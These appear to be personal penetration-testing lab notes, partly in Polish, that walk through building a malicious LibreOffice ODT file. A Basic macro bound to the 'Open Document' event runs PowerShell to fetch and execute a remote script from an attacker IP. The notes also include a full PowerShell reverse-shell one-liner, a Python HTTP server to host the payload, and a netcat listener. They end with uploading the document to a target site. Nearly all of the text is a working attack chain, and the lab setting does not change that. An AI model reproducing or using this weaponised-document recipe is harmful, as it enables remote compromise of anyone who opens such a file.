1)  create / open odt file

2)  from menu : Tools -> Macros -> Organize Macros -> basic..

3)  "Untitled 1"   ->  "New" [OK]

4)  only checking basic reverse connectin (http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html)


Sub Main
    Shell("cmd /c powershell iwr 192.168.45.210")
End Sub 

or:

Sub Main 
	Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://192.168.45.210:445/powershell_reverse_shell.ps1')""")
End Sub


<click file save>

 !!!!!!!!!!
 CLOSE FILE makro
 !!!!!!!!!!


5)  Attach makro to event:
	from menu: Tools ->  Customize..

new window will show, select  tab: 
			a) Events
			b) select "Open Document"
			c) click on Assigned "Macro"
			b) select marko created in point 3 
			
			
			

6) other shell (this one is reverse shell)

a) file:
powershell_reverse_shell.ps1
containing:
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.210",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

b) get reverse shell from kali in marko :
	
	Sub Main 
		Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://192.168.45.210:445/powershell_reverse_shell.ps1')"")
	End Sub


7)   wrzyucam stworzonego odt na strone  http://192.168.227.169/
a) dla scigniecia reverse shell:
python3 -m http.server 445



b)   i nasluchuje:
sudo nc -lnvp 4444

